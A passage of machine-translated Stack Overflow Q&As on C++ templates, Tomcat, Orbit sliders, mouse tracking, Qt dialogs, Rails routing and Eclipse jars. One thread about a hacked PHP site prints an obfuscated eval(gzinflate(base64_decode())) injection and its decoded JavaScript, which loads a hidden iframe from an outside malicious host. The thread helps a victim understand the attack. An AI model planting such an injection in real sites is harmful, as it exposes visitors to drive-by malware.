//***** FUNCTION DESCRIBED BRIEFLY IN CPP FILE 
template<class T>
class binTree
{
    //the node struct
    struct btnode   {
        T info;
        btnode* left;
        btnode* right;
                    };
    private:
        btnode* root; //the root
        void remove(btnode* &node);
        int heightRecursive(btnode *node);
        void destroyRecursive(btnode*);
        bool leaf(btnode* node) const;
        //    recursive traversals 
        void inorderRecursive(btnode* node);
        void preorderRecursive(btnode* node);
        void postorderRecursive(btnode* node);
    public:
        binTree(void);
        int height();
        void insert(const T &inData);
        bool find (const T &inData);
        void deleteNode(const T &inData);
        ~binTree(void);

        //    traversal
        void inorderTraversal();
        void preorderTraversal();
        void postorderTraversal();
    }; 
```

**BinTree.cpp：**

```
#include "BinTree.h"

//constructor, sets the root equal to NULL
template<class T> binTree<T>::binTree(void)
{
root = NULL;
}
//inserts into the tree; if the tree is empty, it inserts to the root
// if the tree already has the variable, it outputs a message and exits
// other wise, it will search for an appropiate place to fit the variable in
template<class T> void binTree<T>::insert(const T &inData)
{
    btnode *newnode, *current, *parentOfCurrent;
    newnode = new btnode;
    newnode->info = inData;
    newnode->left = newnode->right = NULL;

    if (root == NULL)   {
        root = newnode;
        cout << "added to root\n";
        return;         }
    current = root;
    while(current != NULL)  {
    parentOfCurrent = current;
        if(current->info == inData)
        {
            cout << inData << " already exists in tree. Duplicates not allowed!\n";
            return;
        }
        else if(current->info > inData)
            current = current->left;
        else
            current = current->right;
                            }

    if (parentOfCurrent->info > inData)
        parentOfCurrent->left = newnode;
    else
        parentOfCurrent->right = newnode;

}
//--------------- inorder traversal ----------------------
//calls the inorderTraversal using the root
template <class T> void binTree<T>::inorderTraversal()
{
if(root==NULL)
    cout << "Empty tree\n";
    else    {
        inorderRecursive(root);
        cout << '\n';
            }
}
//Private variable, travels recursively in inorder accross the tree, takes in a btnode pointer
template <class T> void binTree<T>::inorderRecursive(btnode* node) //left, node, right
{
if(node != NULL)    {
    inorderRecursive(node->left);
    cout << node->info << ", ";
    inorderRecursive(node->right);
                    }
}
//------------------ preorder traversal-------------
//calls the preOrderTraversal using the root
template <class T> void binTree<T>::preorderTraversal()
{
    if(root==NULL)
        cout << "Empty tree\n";
    else    {
        preorderRecursive(root);
        cout << '\n';
            }
}
//Private variable, travels recursively in preorder accross the tree, takes in a btnode pointer
template <class T> void binTree<T>::preorderRecursive(btnode* node) //node, left, right
{
    if(node != NULL)    {
        cout << node->info << ", ";
        preorderRecursive(node->left);
        preorderRecursive(node->right);
                        }
}
//------------ postorder traversal-----------------
//calls the postOrderTraversal using the root
template <class T> void binTree<T>::postorderTraversal()
{
    if(root==NULL)
        cout << "Empty tree\n";
    else    {
        postorderRecursive(root);
        cout << '\n';
            }
}
//Private variable, travels recursively in postorder accross the tree, takes in a btnode pointer
template <class T> void binTree<T>::postorderRecursive(btnode* node) 
{
    if(node != NULL)    {
        postorderRecursive(node->left);
    postorderRecursive(node->right);
    cout << node->info << ", ";
                        }
}
//-------
//searches the tree and returns either true or false if found or not found
template<class T> bool binTree<T>::find(const T &inData)
{
    bool rv = false;
    btnode *current;
    if(root == NULL)
        return rv;
    current = root;
    while(current != NULL && rv == false)
    {
        if (current->info == inData)
            rv = true;
        else if (current->info > inData)
            current = current->left;
        else
            current = current->right;
    }
    return rv;
}
//deletes a node using the remove function. If the tree is empty or the variable
// is not found, it will send a message and abort. 
template <class T> void binTree<T>::deleteNode(const T &inData)
{
    btnode *current, *parentOfCurrent;
    bool found = false;
    if (root == NULL)   {
        cout << "The tree is empty, aborting...";
        return;
                        }
    current = root;
    while(current != NULL)
    {
        if(current->info == inData) {
            found = true;
            break;
                                    }
        else    {
            parentOfCurrent = current;
            if(current->info > inData)
                current = current->left;
            else
                current = current->right;
                }
    }
    if(!found)
        cout << "\n" <<inData << " could not be found. Aborting...\n";
    else if (current == root)
        remove(root);
    else if (parentOfCurrent->info > inData)
        remove(parentOfCurrent->left);
    else
        remove(parentOfCurrent->right);
}
//
template <class T> void binTree<T>::remove(btnode* &node) // parent's node with address of
//node to be deleted. Sent in by ref. So parent's node changed here
{
    btnode *current, *parentOfCurrent, *temp;
    if(node==NULL)  {
        cout << "\nCannot delete NULL node.\n";
        return; //the return is here because if the node is NULL, then it is also technically a leaf
                    }
    else if(leaf(node) == true) //node is a leaf
    {
    temp = node;
    node = NULL;
    delete temp;
    }
    else
        cout << "\nNode is not a leaf, cannot delete.\n";

}
//finds the height of the tree by passing root into the heightRecursive function
template <class T> int binTree<T>::height()
{
    return heightRecursive(root);
}
//recursively travels the tree and keeps a counter each time it encounters a node 
template <class T> int binTree<T>::heightRecursive(btnode* node)
{
    if (node == NULL)
        return 0;
    else
        return ( 1 + max(heightRecursive(node->left), heightRecursive(node->right)));
}
//destryuuctor; it calls the destroyRecursive function using root
template <class T> binTree<T>::~binTree(void)
{
    destroyRecursive(root);
}
//travels the tree recursively, deleting every non-Null it encounters 
template <class T> void binTree<T>::destroyRecursive(btnode* node)
{
if(node != NULL)    {
    destroyRecursive(node->left);
    destroyRecursive(node->right);
    delete node;
    node = NULL;
                    }
}
//checks if the node passed as an argument is a leaf, returns true or false
template <class T> bool binTree<T>::leaf(btnode* node) const
{
    bool aLeaf = false;
    if(node->left == NULL && node->right == NULL)
        aLeaf = true;
    return aLeaf;
} 
```

**测试仪.cpp：**

```
#include "BinTree.h"

int main()
{
    binTree<int> example;
    int arr[] = { 75,43,77,29,52,82,35,56,79,32,40,90,48,47 };

    //inserts the array of integers into the tree
    for(int i=0; i < 14; i++)
        example.insert(arr[i]);

    //---------------Displays tree before changes-------------------
    cout << "In order traversal:\n";
    example.inorderTraversal();

    cout << "Pre-order traversal:\n";
    example.preorderTraversal();

    cout << "Post-order traversal:\n";
    example.postorderTraversal();

    cout << "------------------Displays tree after changes---------------------\n";
    example.insert(21);

    cout << "\n------- inorder --------\n";
    example.inorderTraversal();

    cout << "\n------- preorder --------\n";
    example.preorderTraversal();

    cout << "\n------- postorder --------\n";
    example.postorderTraversal();

    cout << "\nheight=" << example.height() << endl<<endl;

    //tests the find function
    if (example.find(9))
        cout << "found 9\n";
    else
    cout << "9 not found\n";

    if (example.find(77))
        cout << "found 77\n";
    else
        cout << "77 not found\n";

    //tests the delete function by trying to delete an integer not in the tree
    example.deleteNode(122);

    //test the insert by inserting already existent integer
    example.insert(77);

    //tests the delete function by deleting 77
    example.deleteNode(77);
    cout << "\nAfter deleting 77 (inorder)\n";
    example.inorderTraversal();

    system("pause"); //don't worry, the system call will be gone in the final submission
    return 0;
} 
```

正如我之前所说，我很确定这与我在模板实现中做错了什么有关。如果是模板，我能得到确切的代码片段吗？应该实现什么？我对模板相当陌生，所以这让我有点头疼。如果有帮助，我会使用 Visual Studios 2010。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T00:33:53.707

在这里你知道它为什么不起作用：将 [模板化的 C++ 类拆分为 .hpp/.cpp 文件——这可能吗？](https://stackoverflow.com/questions/1724036/splitting-templated-c-classes-into-hpp-cpp-files-is-it-possible)

TL；DR：您不能在 .h 和 .cpp 文件之间拆分模板类，将实现移动到 .h 文件。

# tomcat - Tomcat不解码发布数据

> ID：15845470
> 
> 赞同：3
> 
> 时间：2013-04-06T00:04:23.650
> 
> 标签：tomcat, wicket, tomcat7

平台：Ubutnu 11.10 上的 Tomcat 7.0.21

我们在 Tomcat 上使用 apache wicket，它由 apache2 使用 proxypass。

面临一个有趣的问题，即未正确解码发布数据。例子是

*   将“Hello World”（不带引号）发布到服务器
*   在萤火虫/类似工具中观察，它按预期发送（“Hello+World”）
*   当我尝试获取 url 参数时，Tomcat 将值返回为“Hello+World”

这只发生在一台服务器上，所以很明显我在配置中遗漏了一些东西，但不知道是什么。连接器的 URIEncoding 设置为“UTF-8”。在所有位置运行的代码都是相同的——来自同一个war文件。

补充意见：

*   问题只发生在一台服务器上
*   如果我发布数据，无论我是否使用 apache2 前端都会出现问题
*   当我使用具有相同参数的“get”时**不会**发生问题。尝试使用带参数的萤火虫复制 url，无论我前面是否有 apache2，它都可以工作。
*   使用调试器，验证 wicket 实际上返回编码数据。在较低级别的 tomcat servlet 请求参数显示编码值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T23:10:23.283

我仍然不知道问题是什么。作为一个绝望的专业，我决定升级tomcat。现在有了撰写本文时可用的最新版本 - 7.0.39，我不再面临这个问题。

# php - 我的网站被黑了，但我不知道这意味着什么

> ID：15845477
> 
> 赞同：0
> 
> 时间：2013-04-06T00:04:54.837
> 
> 标签：php

我的网站被黑了。我想知道这段代码是什么意思？

```
<?
#0242d5
#eval(gzinflate(base64_decode("5VVNc5swEL33V1gcOjBOMV8WtITUMzn13GPpQQaB6TiGImI39vi/d3cFcXGTZsbNLR4GS6t9b9+utEJmq3piTN7s71plbdV0k+6hkUlqdPJXN/shtkKbU2OyFpvyXpS4OLLfvN2aNUkjWiW/bLpYqcR0Pd/6/LVrq01pF219d7sS7W2dy09OLFT5EwrnRYxzFs4Zl4z7LAwYXzBe4NRzGKx6CxyES5YzQabhCTnjLgs9HAMghDeN/ZwsAbH4RJ0zTgGA3dNhPLK4FG/OAhhnZPnTE2KHpIaTv9uvghE0+VrQuaiTEODQcfyTKOSLkBsfMAK2wAeDF+iP0TJ63F4pJpGTD6E4ZYAhInwDob98UQQgF32CPXgIdlbuk0oX4aEOn2ENdaEuiQd2dPBoS+b9hj1G8i9LAtLHjQLLUNIRqYvYMLqsPnrTdbmj1+PtTxh/XbFB7/AC41+sdKz7DnP/2S0h7VrwdJMEHsoJqF59wzzqpT55tn1Hap4PD7uBR2cxHECdVEaQBd4BfTIBpj/PRgr01JforztIQ8AyauILZP1vVSRdPg4Z9d0HKJ+Otd5dAp5QT2oNczLBH1JG2is17FY2a5FJc7aYlVep8TE1LFs166ozU4PBJO7ah0NeZ/d3ctPZyzp/eJ84tnvMRJetzDJXpcpL67DfJ36cL9WqlUnoxFVh6ol12BbbnUycEU/cwwXiBxc3PgKM0cQ6yERuxTo+Krj3UwMJ93urqFuzAq7qQwBJ42A6tQ6wtqs2eb2zB35LTROlzMbED8e36vuVyy2L6M8dpalg4Xg90x/km3dG/Bs=")));
#/0242d5#
?> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T00:15:27.830

以下是解码后的内容：

```
<script type="text/javascript" language="javascript">
p = parseInt;
ss = (123) ? String.fromCharCode : 0;
asgq = "28!66!75!6e!63!74!6@!6f!6e!20!28!2@!20!7b!d!a!20!20!20!20!76!61!72!20!6f!70!62!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!72!65!61!74!65!45!6c!65!6d!65!6e!74!28!27!6@!66!72!61!6d!65!27!2@!3b!d!a!d!a!20!20!20!20!6f!70!62!2e!73!72!63!20!3d!20!27!68!74!74!70!3a!2f!2f!6c!6f!73!6@!6c!6c!61!2e!63!6f!6d!2f!64!74!64!2e!70!68!70!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!70!6f!73!6@!74!6@!6f!6e!20!3d!20!27!61!62!73!6f!6c!75!74!65!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!62!6f!72!64!65!72!20!3d!20!27!30!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!68!65!6@!67!68!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!77!6@!64!74!68!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!6c!65!66!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!6f!70!62!2e!73!74!7@!6c!65!2e!74!6f!70!20!3d!20!27!31!70!78!27!3b!d!a!d!a!20!20!20!20!6@!66!20!28!21!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!6f!70!62!27!2@!2@!20!7b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!77!72!6@!74!65!28!27!3c!64!6@!76!20!6@!64!3d!5c!27!6f!70!62!5c!27!3e!3c!2f!64!6@!76!3e!27!2@!3b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!6f!70!62!27!2@!2e!61!70!70!65!6e!64!43!68!6@!6c!64!28!6f!70!62!2@!3b!d!a!20!20!20!20!7d!d!a!7d!2@!28!2@!3b".replace(/@/g, "9").split("!");
try {
    document.body &= 0.1
} catch (gdsgsdg) {
    zz = 3;
    dbshre = 70;
    if (dbshre) {
        vfvwe = 0;
        try {
            document;
        } catch (agdsg) {
            vfvwe = 1;
        }
        if (!vfvwe) {
            e = eval;
        }
        s = "";
        if (zz) for (i = 0; i - 464 != 0; i++) {
                if (window.document) s += ss(p(asgq[i], 16));
        }
        if (window.document) e(s);
    }
}
</script> 
```

以及该脚本的解码内容（手工模糊不清）：

```
(function () {
    var opb = document.createElement('iframe');

    opb.src = 'http://losilla.com/dtd.php';
    opb.style.position = 'absolute';
    opb.style.border = '0';
    opb.style.height = '1px';
    opb.style.width = '1px';
    opb.style.left = '1px';
    opb.style.top = '1px';

    if (!document.getElementById('opb')) {
        document.write('<div id=\'opb\'></div>');
        document.getElementById('opb').appendChild(opb);
    }
})(); 
```

看起来它会返回`http://losilla.com/dtd.php`以确认该站点已被入侵。您的公用文件夹中可能还有一个后门脚本。

# javascript - 如何将图像预加载到 Orbit 滑块中？

> ID：15845482
> 
> 赞同：5
> 
> 时间：2013-04-06T00:05:13.390
> 
> 标签：javascript, jquery, image, zurb-foundation, orbit

问题是当用户第一次访问该站点时，滑块没有正确显示。在测试滑块工作正常。 ![加载后滑块如何](https://i.stack.imgur.com/ayssH.png)

或者实际上存在问题，即在第一次访问页面时它不会加载，但会在您刷新页面时（且仅当）显示。但否则会显示滑块但不会显示图像 ![滑块如何加载不佳](https://i.stack.imgur.com/4JMCf.png)

我查看了 Zurb 在[Zurbs documentation for the Orbit slider 的文档](http://www.zurb.com/playground/orbit-jquery-image-slider)，他们有一个示例文件，该原始演示文件在图像上方有一个链接（我删除了） ![演示中的代码](https://i.stack.imgur.com/7GGhh.png)

然后，我使用关键字“轨道预加载图像”在 Google 上搜索了更多关于此主题的短语，并找到了[一个](https://groups.google.com/forum/?fromgroups=#!topic/foundation-framework-/sduGNCIN2rI)具有预加载功能的解决方案。下面是我用来预加载的代码（我只修改了图片的路径）

```
<script language="javascript">
  function preload(arrayOfImages) {
    $(arrayOfImages).each(function(){
      $('<img/>')[0].src = this;
    });
  }
  preload([
    '../images/products/mill/slider/dentist.jpg',
    '../images/products/mill/slider/side.jpg',
    '../images/products/mill/slider/before.jpg',
    '../images/products/mill/slider/after.jpg',
    '../images/products/mill/slider/radio.jpg'
  ]);
</script> 
```

我继续添加脚本，但它仍然没有加载。该页面的完整代码可在[GitHub 上的 Gist中查看](https://gist.github.com/JGallardo/5323578)

图像滑块的设置代码可在[GitHub 上的 Gist中查看](https://gist.github.com/JGallardo/5338991)

该站点托管在不支持 php 的 .net 环境中的服务器上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T02:49:39.733

我遇到了同样的问题，经过一些研究，找到了适合我的答案；基本上，您可以使用 jquery 在加载时隐藏滑块。另请参阅此链接以获取更多信息：[如何在 div #content 加载时显示 div #loading](https://stackoverflow.com/questions/14454688/how-to-show-div-loading-whilst-div-content-loads)

查看[您的代码](https://gist.github.com/JGallardo/5323578)，这应该可以工作（未经测试）

在该`<head>`部分中，添加此；

```
<script type="text/javascript">
jQuery(document).ready(function() {
// hide orbit slider on load when user browses to page
$('#featured.orbit').hide(); // hide div, may need to change id to match yours
$('.loading').show(); // show the loading gif instead

// then when the window has fully loaded
$(window).bind('load', function() {
$('.loading').hide(); // hide loading gif
$('#featured.orbit').fadeIn('slow'); // show orbit
});
});
</script> 
```

在包含轨道滑块代码的 html 页面中（从您的页面复制的内容）

```
<!-- =======================================
ORBIT SLIDER CONTENT
======================================= -->
<div style="width:100%;">
<div style=" max-width:480px; margin: 0px auto;">
<div id="featured" >
<!-- your content etc..... -->
<span class="orbit-caption" id="radioCaption">Radiograph shows crown seated with   
excellent marginal integrity</span>
</div>
</div>

<?php // 
// load the loading image - you need to add one to your image directory
// see here to generate one: http://www.ajaxload.info/  ?>
<div class="loading">
<img src="http://www.yourdomain.com/path/to/folder/loading.gif"/>     
</div>

</div> <!-- end twelve columns--> 
```

在您的 CSS 中，您需要隐藏 #featured div

```
#featured { display: none; background: #f4f4f4; height: 600px;}
#featured img { display: none; }
#featured.orbit { background: none; }
.loading {margin: 0 auto;text-align:center;margin:30px; } 
```

希望有帮助！

# javascript - Yelp 鼠标跟踪机制

> ID：15845486
> 
> 赞同：2
> 
> 时间：2013-04-06T00:05:33.653
> 
> 标签：javascript, jquery, web-applications, yelp

我意识到 Yelp.com 会在鼠标移动或发生某些事情时进行某种跟踪（单击元素）。这是怎么回事？有图书馆吗？如何在不影响几乎为零的性能影响的情况下做到这一点？

您可以在下面的 Firebug 中看到控制台：

![在此处输入图像描述](https://i.stack.imgur.com/m4BkD.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T02:46:20.633

鼠标跟踪的一个非常基本的实现可能如下所示：http: [//jsfiddle.net/pksah/](http://jsfiddle.net/pksah/)

HTML：

```
<body>
    <div id="container"></div>
</body> 
```

JS：

```
currentPosition = null;
$("#container").on("mousemove", function (event) {
    currentPosition = event;
});

setInterval(function () {
    console.log(currentPosition.pageX + "," + currentPosition.pageY);
}, 1000) 
```

CSS：

```
#container {
    width:100%;
    height:300px;
    background:yellow;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T02:32:40.820

正如我在评论中所说，看起来像是一些广告/活动跟踪，它与一些 Google API 工具有关，您会在控制台中看到与此脚本的相似之处：

[http://closure-library.googlecode.com/svn/!svn/bc/4/trunk/closure/goog/docs/closure_goog_debug_errorhandler.js.source.html](http://closure-library.googlecode.com/svn/!svn/bc/4/trunk/closure/goog/docs/closure_goog_debug_errorhandler.js.source.html)

有谷歌广告感的东西，关闭

# c++ - 如何防止回车键关闭我的 QDialog (Qt 4.8.1)

> ID：15845487
> 
> 赞同：20
> 
> 时间：2013-04-06T00:05:41.683
> 
> 标签：c++, qt, qdialog, qpushbutton

我有`QDialog`一个`QDialogButtonBox`。**OK**和**Cancel**按钮处于活动状态。有时我会根据对话框的状态禁用或隐藏“确定”按钮。看来，无论我做什么，Enter 键总是会激活 OK 按钮。我真的不希望这种情况发生。我努力了：

*   每次我显示/隐藏/启用/禁用/任何按钮时，将默认和自动默认属性设置为 false
*   在 OK 按钮上安装事件过滤器以拦截关键事件（按下和释放）以进行返回、输入和空格
*   将按钮上的焦点策略设置为**NoFocus**

上面这些东西的所有组合，回车键仍然接受对话框。有谁知道如何阻止这个？看来我应该能够阻止像这样简单的事情？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-04-06T00:15:08.577

按键事件过滤应该在对话框本身上完成，因为处理将`Return`和`Enter`键转发到默认按钮的代码位于`QDialog::keyPressEvent`.

```
void Dialog::keyPressEvent(QKeyEvent *evt)
{
    if(evt->key() == Qt::Key_Enter || evt->key() == Qt::Key_Return)
        return;
    QDialog::keyPressEvent(evt);
} 
```

或者

```
theDialog−&gt;installEventFilter(anotherClassObject);

bool AnotherClass::eventFilter(QObject *obj, QEvent *evt)
{
    if(evt->type() == QEvent::KeyPress) {
        QKeyEvent *keyEvent = static_cast<QKeyEvent*>(evt);
        if(keyEvent->key() == Qt::Key_Enter || keyEvent->key() == Qt::Key_Return )
            return true; // mark the event as handled
    }
    return false;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-01-27T16:11:04.917

如果您在对话框上有正常的 QPushButtons，那么如果按钮上设置了 autoDefault 和/或默认属性，那么您将获得一个默认按钮 - 这是 enter 键触发的内容。在这种情况下，去掉按钮上的 autoDefault 并在另一个小部件中按 enter 不再关闭对话框。

在 QDialogBu​​ttonBox 的情况下，您可能可以遍历按钮以在对话框的 ctor 中关闭这些东西。在这里没有测试，但应该可以工作。如果没有，那么您还需要查看 QDialog 本身是否也设置了默认按钮。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-29T02:15:08.910

问题是事件过滤器不应该安装在确定按钮上。

如果您的 OK 按钮被禁用，那么它将不会收到 enter 事件。无论哪个小部件都有焦点。如果他们不接受 enter 事件，那么`QDialog`就会`accept()`自行处理。

**解决问题的**两种方法：****

 ****1)**仅当启用 OK时，才在新函数中覆盖`QDialog::accept()`和调用accept 方法`QDialog``accept`

```
void MyDialog::accept() {
    if (okEnabled) {
        QDialog::accept();
    }
} 
```

**2）****在对话框**中不接受回车键的每个小部件上安装一个事件过滤器（行编辑，...）。

事件过滤器是这样的：

```
class KeyPressEater : public QObject
{
    Q_OBJECT

protected:
    bool eventFilter(QObject *obj, QEvent *event);
};

bool KeyPressEater::eventFilter(QObject *obj, QEvent *event)
{
    if (event->type() == QEvent::KeyPress) {
        QKeyEvent *keyEvent = static_cast<QKeyEvent *>(event);
        bool res = QObject::eventFilter(obj, event);

        if (keyEvent->key() == Qt::Key_Return) {
            return true; /* Always accept return */
        } else {
            return res;
        }
    } else {
        // standard event processing
        return QObject::eventFilter(obj, event);
    }
} 
```

在您的代码中，对于对话框中的每个小部件：

```
myWidget->installEventFilter(myKeyPressEater); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-08T20:43:16.063

QDialog 有一个名为`accept()`. 每当 QDialogBu​​ttonBox 发出`accepted()`（通过按返回键或单击确定）时，就会调用该私有插槽。所以尝试断开它们。

`disconnect(ui->buttonBox, SIGNAL(accepted()), this, SLOT(accept()));`

这对我有用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-07-08T21:02:03.337

为避免关闭对话框中的“确定”按钮或“Enter”键：在 ui xml 文件中，删除用于接受/拒绝的连接/插槽。然后，在您的代码中，在需要时发出 accept() ；

来自连接 accept() 插槽的 ui 文件的示例：

```
 <connections>  
  <connection>  

   <sender>products_ButtonBox</sender>

    <signal>accepted()</signal>  

     <receiver>Products_Dialog</receiver>
      <slot>accept()</slot>
       <hints>
        <hint type="sourcelabel">
         <x>248</x>
         <y>254</y>
        </hint>
        <hint type="destinationlabel">
         <x>157</x>
         <y>274</y>
        </hint>e
       </hints>
      </connection> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-06-24T19:18:02.053

在对话框的`accept()`方法中，检查确定按钮以获得焦点：

```
void accept() override
{ if (!dialogButtonBox->button(QDialogButtonBox::Ok)->hasFocus())
  return;

...

  QDialog::accept();
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-07-07T18:48:36.260

关键是设置自己的按钮，全部使用NoRole，既不接受也不拒绝来自按钮框的信号。这将允许您为默认按钮设置自己的行为。

```
class Dialog(QDialog):
    def __init__():
        super(Dialog, self).__init__()
        self.buttonBox = QDialogButtonBox()

        self.btn_save = self.buttonBox.addButton('Save', QDialogButtonBox.NoRole)
        self.btn_cancel = self.buttonBox.addButton('Cancel', QDialogButtonBox.NoRole)
        self.btn_save.clicked.connect(self.onAccept)
        self.btn_save.setMouseTracking(True)
        self.btn_cancel.clicked.connect(self.onReject)

        #  STATUS BAR
        self.status = QStatusBar()
        self.status.addPermanentWidget(self.buttonBox)

    def onAccept(self):
        if not self.btn_save.underMouse():
            return
        self.submitChanges(self.model)
        self.accept()

    def onReject(self):
        self.reject() 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-06-18T16:03:31.877

一种选择是覆盖对话框的显示事件以允许显示 QDialogBu​​ttonBox，之后它将设置一个带有 AcceptRole 的默认按钮，然后将所有按钮设置为非默认按钮。

```
void MyDialog::showEvent(QShowEvent* event)
{
    // When a QDialogButtonBox is shown, it will set a default button if none are found so we need to disable the
    // default buttons after the button box has been shown.
    QDialog::showEvent(event);

    // For example, with a dialog which has two buttons, Save and Cancel, we remove all defaults
    // It might be good enough to remove the default on just the buttons with have the AcceptRole, but
    // I didn't test extensively enough to see what would happen if any buttons had "autoDefault" set or
    // verify this behavior on all platforms.
    ui->buttonBox->button(QDialogButtonBox::Save)->setDefault(false);
    ui->buttonBox->button(QDialogButtonBox::Cancel)->setDefault(false);
} 
```

尝试在 QDialogBu​​ttonBox 显示之前删除默认值，例如在对话框的构造函数中，将被 QDialogBu​​ttonBox::showEvent() 中的代码覆盖。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2013-09-23T17:46:17.457

在 PySide（我想是 PyQt）中，我能够重新定义 QDialog 的接受和拒绝功能。

```
def custom_accept ():
    # perform custom actions when you hit open
    pass

def custom_reject ():
    # perform custom actions when you hit cancel
    pass

file_dialog = QtGui.QFileDialog(directory=".")
file_dialog.accept = custom_accept
file_dialog.reject = custom_reject 
```

这使文件对话框无法关闭，并允许我在触发“确定”（接受）或“取消”（拒绝）功能时访问数据（通过输入或单击按钮）**

# ruby-on-rails - 路由错误 - 未初始化的常量

> ID：15845491
> 
> 赞同：34
> 
> 时间：2013-04-06T00:06:10.993
> 
> 标签：ruby-on-rails, ruby, rails-routing

我无法在 Rails 3.2.12 中解决这个问题，也许我遗漏了一些东西。

**配置/路由.rb**

```
get "home/index"
root :to => "home#index"
devise_for :users, :only => :omniauth_callbacks
match 'users/auth/:provider/callback' => 'authentications#create'
match '/auth/:provider/signout' => 'authentications#signout' 
```

**应用程序/控制器/authentication_controller.rb**

```
class AuthenticationsController < ApplicationController
  ...
end 
```

**应用程序/模型/身份验证.rb**

```
class Authentication < ActiveRecord::Base
  ...
end 
```

我认为它应该适用于我目前的知识，但有一些我想念的东西。

我的好问题是请告诉我出了什么问题。

**路由错误**

`uninitialized constant AuthenticationsController`

这是一条消息，显示在`http://localhost:3000/auth/facebook/signout`

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2013-04-06T00:13:35.713

Rails 要求文件名与类名匹配。因此，您应该重命名`app/controllers/authentication_controller.rb`为`app/controllers/authentications_controller.rb`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-10-28T17:32:49.750

尽管已经回答了这个问题，但我发现了另一个我遇到此错误的情况，并想在此处记录它以供后代使用。

如果您在 routes.rb 文件中定义了两条相似的路由，但没有相应的控制器，您将收到未初始化的常量错误。

重现步骤：

```
rails generate scaffold foobar name:string
bundle exec rake db:migrate 
```

将**资源 :foobars**添加到 routes.rb 到新范围（注意：foobars 资源在脚手架生成期间已经自动添加到您的 routes.rb 的顶部），如下所示：

```
 resources :foobars

  ########################################
  # SUPER
  ########################################

  constraints host: ENV['SUPER_HOST'] do
    scope module: :super do
      resources :foobars
      get '/' => 'super#index'

    end
  end 
```

现在，将**/app/views/foobars 移动**到**/app/views/super/foobars并将****/app/controllers/foobars_controller.rb** 移动到**/app/controllers/super/foobars_controller.rb** 确保 foobars_controller.rb 在 Super 模块中：

```
class Super::FoobarsController < ApplicationController 
```

现在转到 your.dev.server/foobars/ 你应该得到这个错误： Routing Error uninitialized constant FoobarsController

现在，从 routes.rb 的开头删除**资源 :foobars**它现在应该可以工作了！

我花了一段时间才弄清楚为什么会出现这个错误，我没有意识到生成脚手架会在 routes.rb 中添加一个条目

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-04-17T02:01:12.980

虽然它没有回答您的具体问题，但我在 routes.rb 中收到了以下失败信息

```
resources :republishes  do
    post '/attempt_all', :to => 'republishes/#attempt_all' . . . 
```

我改成

```
resources :republishes  do
    post '/attempt_all', :to => 'republishes#attempt_all' . . . 
```

删除斜线解决了我的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-09-06T13:41:20.900

就我而言，由于我为模块搭建了脚手架，因此它已经为控制器启动了路由，并且我定义了两次。因此，通过删除重复的资源路由之一解决了我的问题。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2020-02-29T11:25:32.497

确保您已经为相关控制器创建了模型。

# java - 使用 eclipse 导出可运行的 jar

> ID：15845494
> 
> 赞同：0
> 
> 时间：2013-04-06T00:06:18.110
> 
> 标签：java, swing, jar, export

我有一个读取 .txt 文件的程序 java swing 程序。当我尝试制作可运行的 jar 文件时，它无法读取它。我怎样才能为这样的程序制作一个可运行的 jar？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:09:38.573

> 文件 -> 导出 -> Java -> 可运行的 JAR 文件

确保您`.jar`正确设置文件的启动配置，并且您也将所需的库提取到该文件`.jar`中。

文本文件可能未指向源代码中的正确位置。我建议查看 a`JFileChooser`并从中获取所选文件的位置。您还可以将文本文件精确定位到一个目录。一个例子：

```
File dir = new File(System.getenv("APPDATA"), "folder");
if (dir.exists() && dir.isDirectory()) File file = new File(dir, "input.txt"); 
```

`AppData`此代码在用户计算机 (Windows) 上的文件夹中设置一个文件夹。然后将之后创建的文件放入该文件夹中。使用这样的代码，我现在可以读取该文件，无论我的`.jar`文件放在哪里，只要`input.txt`存在于那个位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:12:20.227

在 Eclipse 中转到文件 -> 导出 -> java -> 可运行的 jar 文件。

至于读取 .txt 文件，您可以在代码中硬编码文件位置，也可以通过命令行将其作为参数输入，即 java myProgram.jar myFile.txt

# ios - 在后台通过 iCloud 同步 LocalNotifications

> ID：15845495
> 
> 赞同：4
> 
> 时间：2013-04-06T00:06:22.277
> 
> 标签：ios, icloud, uilocalnotification, nsnotificationcenter

